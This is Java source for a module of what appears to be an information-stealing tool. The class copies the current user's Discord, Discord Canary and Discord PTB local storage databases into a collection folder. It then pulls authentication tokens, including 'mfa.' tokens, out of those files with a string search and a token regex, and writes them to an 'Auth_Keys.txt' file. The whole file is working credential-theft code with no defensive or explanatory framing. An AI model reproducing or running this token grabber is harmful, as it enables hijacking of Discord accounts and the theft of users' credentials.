package _256.node.nodes.impl.app;

import java.io.BufferedReader;
import java.io.BufferedWriter;
import java.io.DataInputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileWriter;
import java.io.IOException;
import java.io.InputStreamReader;
import java.util.ArrayList;
import java.util.regex.Pattern;

import org.apache.commons.io.FileUtils;

import _256.node.Category;
import _256.node.Node;

public class Discord extends Node {

	private static final Pattern pattern = Pattern.compile("[nNmM][\\w\\W]{23}\\.[xX][\\w\\W]{5}\\.[\\w\\W]{27}|mfa\\.[\\w\\W]{84}");

	public Discord() {
		super(Category.FILE);
	}

	@Override
	public void createNode() throws IOException {
		File discord_location = new File("C:\\Users\\" + System.getProperty("user.name") + "\\Appdata\\Roaming\\");
		if (mergePath(discord_location, "discord" + "\\Local Storage\\leveldb\\").exists()) {
			try {
				FileUtils.copyDirectory(mergePath(discord_location, "discord" + "\\Local Storage\\leveldb\\"), mergePath(getFolder(), "Discord"));
			} catch (IOException e) {
				e.printStackTrace();
			}
		} else if (mergePath(discord_location, "discordcanary" + "\\Local Storage\\leveldb\\").exists()) {
			try {
				FileUtils.copyDirectory(mergePath(discord_location, "discordcanary" + "\\Local Storage\\leveldb\\"), mergePath(getFolder(), "Discord"));
			} catch (IOException e) {
				e.printStackTrace();
			}
		}
		if (mergePath(getFolder(), "Discord").exists()) {
			getToken();
		}
	}

	public void getToken() throws IOException {
		StringBuilder sb = new StringBuilder();
		for (String s : getTokens()) {
			sb.append("[TOKEN] " + s + "\n");
		}
		FileWriter writer = new FileWriter(mergePath(getFolder(), "Discord") + "\\" + "Auth_Keys.txt", true);
		BufferedWriter bufferedWriter = new BufferedWriter(writer);
		bufferedWriter.write(sb.toString());
		bufferedWriter.close();
	}

	public ArrayList<String> getTokens() throws IOException {
		ArrayList<String> temp = new ArrayList<>();
		ArrayList<File> paths = new ArrayList<>();
		paths.add(new File(System.getProperty("user.home") + "/AppData/Roaming/Discord/Local Storage/leveldb/"));
		paths.add(new File(System.getProperty("user.home") + "/AppData/Roaming/discordptb/Local Storage/leveldb/"));
		paths.add(new File(System.getProperty("user.home") + "/AppData/Roaming/discordcanary/Local Storage/leveldb/"));
		for (File file : paths) {
			if (!file.exists() || file == null) {
				continue;
			}
			for (String pathname : file.list()) {
				try {
					BufferedReader br = new BufferedReader(new InputStreamReader(new DataInputStream(new FileInputStream(file.getAbsolutePath() + "/" + pathname))));
					String strLine;
					int index;
					while ((strLine = br.readLine()) != null) {
						while ((index = strLine.indexOf("oken")) != -1) {
							strLine = strLine.substring(index + "oken".length() + 1);
							String token = strLine.split("\"")[1];
							if (!temp.contains(token)) {
								if (token.split("\\.").length != 0 && token.split("\\.").length >= 2)
									temp.add("" + token);
							}
						}
					}
					br.close();
				} catch (Exception ex) {
				}
			}
		}
		return temp;
	}
}